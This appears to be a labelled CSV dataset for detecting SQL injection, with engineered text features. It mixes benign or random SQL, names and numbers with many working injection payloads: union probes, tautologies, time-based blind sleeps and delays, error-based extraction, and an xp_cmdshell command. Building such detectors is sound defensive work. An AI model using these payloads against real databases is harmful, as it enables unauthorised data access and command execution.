Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",1,or char char char char regexp_substring repeat right char null,174,10,1,0,11,0,35,1,0,52,3,8
select * from customers  where country = 'germany' and  ( city = 'berlin' or city = 'münchen' ) ;,0,select from customers where country germany and city berlin or city nchen,97,12,6,0,4,0,18,2,1,63,5,0
"-6368' union all select 6529,6529,6529--",1,union all select,40,3,1,0,2,1,4,0,3,14,3,0
aristin,0,aristin,7,1,0,0,0,0,0,0,0,7,0,0
"  select grandfatherid as id, friend as edge from fact",0,select grandfatherid as id friend as edge from fact,54,9,0,0,1,0,9,0,0,43,4,0
select * from door where    not pleasant = 'local',0,select from door where not pleasant local,50,7,2,0,1,0,8,1,1,35,4,0
1  )   as mtnw where 7293  =  7293 and 2603  =  5764--,1,as mtnw where and,54,4,0,0,2,1,11,1,2,14,3,0
"   select lower,cool,suggest,area,whenever     (  (  salmon join tried on factor.smooth =  army.definition )   inner join dishon orders.girl =  depth.shelterid ) ",0,select lower cool suggest area whenever salmon join tried on factor smooth army definition inner join dishon orders girl depth shelterid,162,21,0,0,10,0,20,0,0,116,5,1
"select * from heard where certainly between ""place"" and    ""ruler""",0,select from heard where certainly between place and ruler,66,9,0,4,0,0,9,1,1,49,5,0
81,0,,2,0,0,0,0,0,0,0,0,0,0,0
select avg ( toward ) from bow,0,select avg toward from bow,30,5,0,0,0,0,6,0,0,22,2,1
"-1755%' union all select 2615,2615,2615,2615,2615,2615#",1,union all select,55,3,1,0,7,1,4,0,1,14,3,0
select * from nearly where hang = 'paper'  or term = 'golden',0,select from nearly where hang paper or term golden,61,9,4,0,2,0,11,1,1,42,4,0
select top 50 percent * from trap select * from toy fetch first 50 percent rows onlyselect top 3 * from tube,0,select top percent from trap select from toy fetch first percent rows onlyselect top from tube,108,16,0,0,0,0,21,0,3,79,8,0
"1'  )   as hlbq where 2347  =  2347 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,as hlbq where and ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,363,25,1,0,26,1,77,1,2,92,10,10
"1%'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  '%'  =  '",1,or select count from generate_series and,139,6,4,0,6,0,25,2,1,34,4,1
"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,and select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,147,20,1,0,8,1,24,1,3,72,7,1
t'exec master..xp_cmdshell 'nslookup www.googl ...,1,exec master xp_cmdshell nslookup www googl,50,6,2,0,7,0,4,0,0,37,0,0
select avg ( act ) from service select sum ( program ) ,0,select avg act from service select sum program,55,8,0,0,0,0,12,0,0,39,3,2
-8701%'   )    )    or   (  4843  =  1690  )  *1690 and    (    (   '%'  =  ',1,or and,77,2,4,0,4,0,15,2,2,5,2,0
7.13887e+14,0,13887e,11,1,0,0,1,0,0,0,1,1,0,0
-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,where or in char char char char char select case when then char else char end char char char char char,354,21,1,0,2,1,76,1,13,82,9,12
empel6tarse,0,empel6tarse,11,1,0,0,0,0,0,0,0,10,0,0
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'jzpb'  =  'jzpb,1,and select upper xmltype chr chr chr chr chr chr chr select case when then else end from dual chr chr chr chr chr chr from dual and jzpb jzpb,451,30,4,0,29,0,96,2,0,112,11,15
vilaprio,0,vilaprio,8,1,0,0,0,0,0,0,0,8,0,0
1'  )   as gxfu where 9676  =  9676,1,as gxfu where,35,3,1,0,1,0,7,0,0,11,2,0
7.93075e+15,0,93075e,11,1,0,0,1,0,0,0,1,1,0,0
select * from industry where lunch between '1996-07-01' and '1996-07-31',0,select from industry where lunch between and,72,7,4,0,0,0,9,1,5,38,5,0
1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,rlike select from select sleep vwyq,93,6,0,0,1,1,19,0,1,30,4,1
"-7482%""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,1,or convert int select char char char char char select case when then char else char end char char char char char and,388,23,0,4,6,0,82,2,11,94,9,12
1' and 9198  =  9198--,1,and,22,1,1,0,1,1,4,1,2,3,0,0
 or 1  =  1 or ''  =  ',1,or or,23,2,3,0,2,0,8,2,0,4,2,0
select count ( chamber ) from managed,0,select count chamber from managed,37,5,0,0,0,0,6,0,0,29,2,1
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1,select from users where id or union select version,81,9,0,1,4,2,17,1,3,42,6,1
otumba 24 13e,0,otumba 13e,13,2,0,0,0,0,2,0,0,7,0,0
select * from toward where valuable = 'health'  and city = 'knowledge',0,select from toward where valuable health and city knowledge,70,9,4,0,2,0,11,1,1,51,4,0
select * from productswhere productname not between 'carnarvon tigers' and 'mozzarella    di giovanni',0,select from productswhere productname not between carnarvon tigers and mozzarella di giovanni,102,12,4,0,0,0,12,2,1,82,5,0
select option_value from wp_options where option_name  =  '_houzez_property_type_2679' limit 1,0,select option_value from wp_options where option_name _houzez_property_type_2679 limit,94,8,2,0,8,0,9,0,0,68,4,0
23611263s,0,23611263s,9,1,0,0,0,0,0,0,0,1,0,0
"1"" where 7796  =  7796",1,where,22,1,0,1,1,0,4,0,0,5,0,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%'  =  '",1,select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4 and,116,20,3,0,9,0,18,1,1,72,7,1
1 where 4985  =  4985 order by 1#,1,where order by,33,3,0,0,2,1,7,0,0,12,3,0
 update settle set feathers = 'motor'where breathing = 'spent',0,update settle set feathers motor where breathing spent,62,8,4,0,2,0,9,0,0,47,3,0
"calle muelles 57, 10?d",0,calle muelles,22,2,0,0,2,0,3,0,0,13,0,0
77232447b,0,77232447b,9,1,0,0,0,0,0,0,0,1,0,0
knyht9@aspirantes.lt,0,knyht9 aspirantes lt,20,3,0,0,2,0,0,0,0,17,0,0
"-4615'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'jipk' like 'jipk",1,or elt and jipk like jipk,97,6,4,0,2,0,17,2,1,20,3,1
1%'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   '%'  =  ',1,and cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric and,372,22,4,0,27,0,79,2,0,78,9,10
select * from environment where price not between 10 and 20,0,select from environment where price not between and,59,8,0,0,0,0,10,2,1,44,6,0
select * from running where    not rocky = 'involved',0,select from running where not rocky involved,53,7,2,0,1,0,8,1,1,38,4,0
select avg ( party ) from apart select sum ( dish ) ,0,select avg party from apart select sum dish,52,8,0,0,0,0,12,0,0,36,3,2
" select column_name ( s )  from zipper,hot",0,select column_name from zipper hot,42,5,0,0,2,0,7,0,0,30,2,0
"1' in boolean mode  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,in boolean mode or elt sleep,73,6,1,0,3,1,15,1,0,23,2,2
rapariegos,0,rapariegos,10,1,0,0,0,0,0,0,0,10,0,0
"iif  (  1217  =  8831,1,1/0  )  ",1,iif,32,1,0,0,3,0,6,0,1,3,0,0
select   (  case when   (  1093  =  7693  )   then 1093 else 1/  (  select 0  )   end  )  --,1,select case when then else select end,92,7,0,0,1,1,19,0,3,31,7,0
"-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--",1,where union all select,84,4,0,0,7,1,9,0,3,19,4,0
select count ( distinct principle )  from rate,0,select count distinct principle from rate,46,6,0,0,0,0,7,0,0,36,3,1
greaves3,0,greaves3,8,1,0,0,0,0,0,0,0,7,0,0
coursdev,0,coursdev,8,1,0,0,0,0,0,0,0,8,0,0
"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'skdy'  =  'skdy",1,and char char char char regexp_substring repeat right char null and skdy skdy,233,13,4,0,12,0,44,2,0,64,4,8
3.1201e+15,0,1201e,10,1,0,0,1,0,0,0,1,1,0,0
"1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #",1,in boolean mode and updatexml concat 0x2e 0x7171706a71 select elt 0x717a767a71,162,11,1,0,8,1,26,1,0,47,3,3
"1""  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""liar""  =  ""liar",1,and qqpjq select case when then else end from rdb database qzvzq and liar liar,147,15,4,4,7,0,27,2,0,64,9,1
85765253r,0,85765253r,9,1,0,0,0,0,0,0,0,1,0,0
29360,0,,5,0,0,0,0,0,0,0,0,0,0,0
pozal de gallinas,0,pozal de gallinas,17,3,0,0,0,0,2,0,0,15,0,0
select * from particularly where field between up09/01/1996eat and interest15/31/1996branch,0,select from particularly where field between up09 1996eat and interest15 1996branch,91,11,0,0,0,0,9,1,5,61,5,0
"1%' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '",1,or exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and,185,12,4,0,9,0,34,2,1,46,6,3
"1%'   )    )     )   union all select null,null#",1,union all select null null,48,5,1,0,3,1,7,0,0,22,5,0
"1'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'lgcw'  =  'lgcw",1,or exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and lgcw lgcw,215,14,4,0,7,0,38,2,1,54,6,3
"-7295""  )   or 9323  =  9323#",1,or,29,1,0,1,2,1,5,1,1,2,0,0
select * from wp_posts where id  =  28694 limit 1,0,select from wp_posts where id limit,49,6,0,0,2,0,9,0,1,29,4,0
1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',1,select sbji where rlike select from select sleep sgvo,129,9,4,0,1,0,25,0,3,45,6,1
"  select was as family, visitor as [seen]  from against",0,select was as family visitor as seen from against,55,9,0,0,3,0,9,0,0,41,4,0
idt,0,idt,3,1,0,0,0,0,0,0,0,3,0,0
"1""   )    )     )   union all select null,null,null,null,null,null,null--",1,union all select null null null null null null null,73,10,0,1,6,1,7,0,2,42,10,0
select contain ( s )  from hurt select chair ( s ) ,0,select contain from hurt select chair,51,6,0,0,0,0,12,0,0,34,3,0
9.20248e+15,0,20248e,11,1,0,0,1,0,0,0,1,1,0,0
"   select count ( pond ) , sale from mission by atmosphere",0,select count pond sale from mission by atmosphere,58,8,0,0,1,0,11,0,0,42,3,1
"1   )    )    as kgit where 1919  =  1919 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,as kgit where and char char char char regexp_substring repeat right char null,217,13,0,0,12,1,43,1,2,64,5,8
1'||  (  select 'noik' from dual where 9851  =  9851,1,select noik from dual where,52,5,3,0,3,0,9,0,0,23,3,0
"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  9841  =  9841",1,and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7 and,200,26,0,0,8,0,32,2,1,112,11,1
select man ( s )  from lunch select breathe ( s ) ,0,select man from lunch select breathe,50,6,0,0,0,0,12,0,0,33,3,0
"-4550""  )   as hlwe where 6026  =  6026 or   (  9364  =  9593  )  *9593--",1,as hlwe where or,73,4,0,1,2,1,14,1,4,13,3,0
select * from goes where different = 'catch',0,select from goes where different catch,44,6,2,0,1,0,7,0,1,33,3,0
1  )   as itvm where 1482  =  1482,1,as itvm where,34,3,0,0,1,0,7,0,0,11,2,0
darbanville@chicasdiabolo.tr,0,darbanville chicasdiabolo tr,28,3,0,0,2,0,0,0,0,26,0,0
49440,0,,5,0,0,0,0,0,0,0,0,0,0,0
select * from evidence where square  between 10 and 20,0,select from evidence where square between and,54,7,0,0,0,0,9,1,1,39,5,0
select say ( s )  from camera full outer join,0,select say from camera full outer join,45,7,0,0,0,0,9,0,0,33,4,0
ballobar,0,ballobar,8,1,0,0,0,0,0,0,0,8,0,0
enjabonadura,0,enjabonadura,12,1,0,0,0,0,0,0,0,12,0,0
 )    )   ;waitfor delay '0:0:__time__'--,1,waitfor delay __time__,41,3,2,0,7,1,5,0,2,16,0,2
"-5798"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,or ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,331,22,0,1,25,0,70,1,1,80,8,10
select count ( distinct sport )  from full,0,select count distinct sport from full,42,6,0,0,0,0,7,0,0,32,3,1
"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",1,union all select,65,3,1,0,7,1,4,0,3,14,3,0
7.91264e+15,0,91264e,11,1,0,0,1,0,0,0,1,1,0,0
select * from circle where getting between white09/01/1996next and during15/31/1996came,0,select from circle where getting between white09 1996next and during15 1996came,87,11,0,0,0,0,9,1,5,57,5,0
anatoly,0,anatoly,7,1,0,0,0,0,0,0,0,7,0,0
"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",1,or select count from domain domains as t1 domain columns as t2 domain tables as t3 and,156,17,0,0,7,0,26,2,1,67,7,1
"select sleep  (  5  )   and    (    (     (  ""%""  =  """,1,select sleep and,54,3,0,3,2,0,11,1,0,14,2,1
matilla la seca,0,matilla la seca,15,3,0,0,0,0,2,0,0,13,0,0
select count ( distinct date )  from ground,0,select count distinct date from ground,43,6,0,0,0,0,7,0,0,33,3,1
7e2hered0962n,0,7e2hered0962n,13,1,0,0,0,0,0,0,0,7,0,0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 262331 )  order by meta_id asc",0,select post_id meta_key meta_value from wp_postmeta where post_id in order by meta_id asc,104,13,0,0,8,0,15,0,0,71,7,0
aristofnico,0,aristofnico,11,1,0,0,0,0,0,0,0,11,0,0
where exists  ( select productname from   products where products.supplierid  =  suppliers.supplierid and price  =  22 ) ;,0,where exists select productname from products where products supplierid suppliers supplierid and price,122,13,0,0,5,0,16,1,0,90,6,0
cardedeu 54,0,cardedeu,11,1,0,0,0,0,1,0,0,8,0,0
iruraiz-gauna,0,iruraiz gauna,13,2,0,0,0,0,0,0,1,12,0,0
19224,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1%' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,and char char char char regexp_substring repeat left crypt_key char char char null null,236,14,1,0,18,1,47,1,2,72,4,11
select * from [brazil customers]; create view [products above average price] as,0,select from brazil customers create view products above average price as,79,11,0,0,5,0,11,0,1,62,5,0
"-6440   )    )     )   union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",1,union all select,91,3,0,0,9,1,7,0,3,14,3,0
e2paq48t282r,0,e2paq48t282r,12,1,0,0,0,0,0,0,0,6,0,0
canje,0,canje,5,1,0,0,0,0,0,0,0,5,0,0
9.03287e+15,0,03287e,11,1,0,0,1,0,0,0,1,1,0,0
"1""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""prhp""  =  ""prhp",1,select case when then regexp_substring repeat left crypt_key char char char null null else char char char char end from values and prhp prhp,378,24,0,4,18,0,74,1,0,115,12,11
select option_value from wp_options where option_name  =  '_options_location_address' limit 1,0,select option_value from wp_options where option_name _options_location_address limit,93,8,2,0,7,0,9,0,0,72,4,0
"-5211""   )    )    as bkvr where 4082  =  4082 or 2323  =  8052",1,as bkvr where or,63,4,0,1,2,0,12,1,1,13,3,0
"-7579%"" or 6570  =  1764",1,or,24,1,0,1,2,0,4,1,1,2,0,0
oskar,0,oskar,5,1,0,0,0,0,0,0,0,5,0,0
"-4291""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""xyhi""  =  ""xyhi",1,or ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and xyhi xyhi,376,25,0,4,26,0,77,2,1,91,9,10
select   (  case when   (  8841  =  9675  )   then 8841 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,select case when then else cast as int select from dual end from dual,133,14,0,0,1,1,28,0,3,56,10,0
select * from most order by people,0,select from most order by people,34,6,0,0,0,0,6,0,1,27,4,0
select * from wife where split in  ( select rise from good ) ,0,select from wife where split in select rise from good,61,10,0,0,0,0,13,0,1,44,6,0
orce,0,orce,4,1,0,0,0,0,0,0,0,4,0,0
"  select consistid as id, orange as volume from example",0,select consistid as id orange as volume from example,55,9,0,0,1,0,9,0,0,44,4,0
or 1  =  1--,1,or,12,1,0,0,1,1,3,1,2,2,0,0
select bark ( s )  from as select space from bend,0,select bark from as select space from bend,49,8,0,0,0,0,10,0,0,36,5,0
"1%""   )    )    union all select null,null,null,null,null,null,null,null--",1,union all select null null null null null null null null,74,11,0,1,8,1,6,0,2,46,11,0
38182378d,0,38182378d,9,1,0,0,0,0,0,0,0,1,0,0
dans,0,dans,4,1,0,0,0,0,0,0,0,4,0,0
select * from soon where frozen not between 'remember' and 'has',0,select from soon where frozen not between remember and has,64,10,4,0,0,0,10,2,1,49,6,0
"   select a.customername as customername1, b.customername as customername2,    a.cityfrom customers a, customers bwhere a.customerid <> b.customerid  and a.city  =  b.city ",0,select customername as customername1 customername as customername2 cityfrom customers customers bwhere customerid customerid and city city,172,16,0,0,13,0,20,1,2,129,4,0
"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,in boolean mode or select count from generate_series,113,8,1,0,3,1,20,1,3,44,4,1
"-4355""   )    )     )   or 9323  =  9323#",1,or,41,1,0,1,2,1,7,1,1,2,0,0
select * from  ( select mood from fairly ) ,0,select from select mood from fairly,43,6,0,0,0,0,9,0,1,30,4,0
"1%'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  '",1,and ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and,377,23,4,0,28,0,79,2,0,84,9,10
-6095'  )   or 6872  =  6872 and   (  'bfwm' like 'bfwm,1,or and bfwm like bfwm,55,5,4,0,1,0,10,2,1,17,3,0
1   )    )    and 3228  =  7376#,1,and,32,1,0,0,2,1,6,1,0,3,0,0
select * from found where not greatest = 'none'  and not or = 'dream',0,select from found where not greatest none and not or dream,69,11,4,0,2,0,13,4,1,48,7,1
alises,0,alises,6,1,0,0,0,0,0,0,0,6,0,0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 367808 )  order by meta_id asc",0,select post_id meta_key meta_value from wp_postmeta where post_id in order by meta_id asc,104,13,0,0,8,0,15,0,0,71,7,0
-9644   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5616  =  5616,1,or select upper xmltype chr chr chr chr chr chr chr select case when then else end from dual chr chr chr chr chr chr from dual and,440,28,0,0,29,0,94,2,1,103,11,15
"waitfor delay '0:0:5' and    (    (   ""ykgm""  =  ""ykgm",1,waitfor delay and ykgm ykgm,54,5,2,3,3,0,8,1,0,23,1,2
select min ( hot )  as sum from shoe,0,select min hot as sum from shoe,36,7,0,0,0,0,8,0,0,25,3,1
34473,0,,5,0,0,0,0,0,0,0,0,0,0,0
piedramillera,0,piedramillera,13,1,0,0,0,0,0,0,0,13,0,0
select dollar,0,select dollar,13,2,0,0,0,0,1,0,0,12,1,0
select avg ( price ) from available,0,select avg price from available,35,5,0,0,0,0,6,0,0,27,2,1
"  select ship,thread from different where himself = 'remove' union select was, circus from alike",0,select ship thread from different where himself remove union select was circus from alike,96,14,2,0,3,0,14,0,0,76,6,0
"   select employees.type, count ( orders.locationid )  as comefrom    ( ordersinner join running on orders.talesid  =  employees.herdid ) ",0,select employees type count orders locationid as comefrom ordersinner join running on orders talesid employees herdid,138,16,0,0,6,0,18,0,0,102,4,1
select * from cave order by whale,0,select from cave order by whale,33,6,0,0,0,0,6,0,1,26,4,0
brbara,0,brbara,6,1,0,0,0,0,0,0,0,6,0,0
hierros 161 10f,0,hierros 10f,15,2,0,0,0,0,2,0,0,8,0,0
6390,0,,4,0,0,0,0,0,0,0,0,0,0,0
"1' in boolean mode  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",1,in boolean mode and select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,145,19,1,0,7,1,23,1,1,85,7,1
"-9922'   )    )    union all select 2193,2193,2193--",1,union all select,52,3,1,0,2,1,6,0,3,14,3,0
"  update operation set bat =  'below', city =  'ice' where president =  fell",0,update operation set bat below city ice where president fell,76,10,4,0,4,0,13,0,0,51,3,0
cheyenne,0,cheyenne,8,1,0,0,0,0,0,0,0,8,0,0
select face ( s )  from hurried,0,select face from hurried,31,4,0,0,0,0,6,0,0,22,2,0
6087,0,,4,0,0,0,0,0,0,0,0,0,0,0
select * from  ( select silly from thin ) ,0,select from select silly from thin,42,6,0,0,0,0,9,0,1,29,4,0
select top 3 * from saddle select * from grow 3select * from century,0,select top from saddle select from grow 3select from century,68,10,0,0,0,0,13,0,3,50,6,0
"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",1,as ymqc where union all select,100,6,1,0,7,1,12,0,3,25,5,0
select * from birds where leader  between 10 and 20,0,select from birds where leader between and,51,7,0,0,0,0,9,1,1,36,5,0
mandayona,0,mandayona,9,1,0,0,0,0,0,0,0,9,0,0
"1"" where 5406  =  5406 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,where and extractvalue concat 0x5c 0x7171706a71 select elt 0x717a767a71,162,9,0,1,7,1,25,1,2,42,3,3
pembrooke_coates@stainless.gd,0,pembrooke_coates stainless gd,29,3,0,0,3,0,0,0,0,26,0,0
select * from if 3 select * from tropical,0,select from if select from tropical,41,6,0,0,0,0,8,0,2,30,5,1
"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,as bgdm where or updatexml concat 0x2e 0x7171706a71 select elt 0x717a767a71,180,11,0,0,8,1,30,1,2,44,4,3
" select * from users where id  =  1 or ""@;""  =  1 or 1  =  1 -- 1",1,select from users where id or or,65,7,0,2,5,1,18,2,3,26,5,0
" select column_name ( s )  from happened,getting",0,select column_name from happened getting,48,5,0,0,2,0,7,0,0,36,2,0
select count ( * )  as month,0,select count as month,28,4,0,0,0,0,6,0,1,18,2,1
select avg ( plan ) from aboard,0,select avg plan from aboard,31,5,0,0,0,0,6,0,0,23,2,1
select productname from products,0,select productname from products,32,4,0,0,0,0,3,0,0,29,2,0
select swim ( s )  from heart select what from past,0,select swim from heart select what from past,51,8,0,0,0,0,10,0,0,38,4,0
"1   )    )    as npdl where 5796  =  5796 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,as npdl where and select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,164,19,0,0,7,1,27,1,3,83,8,1
"1""   )    )    as hace where 8785  =  8785",1,as hace where,42,3,0,1,1,0,8,0,0,11,2,0
"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,or select count from generate_series,110,5,1,0,4,1,19,1,3,31,3,1
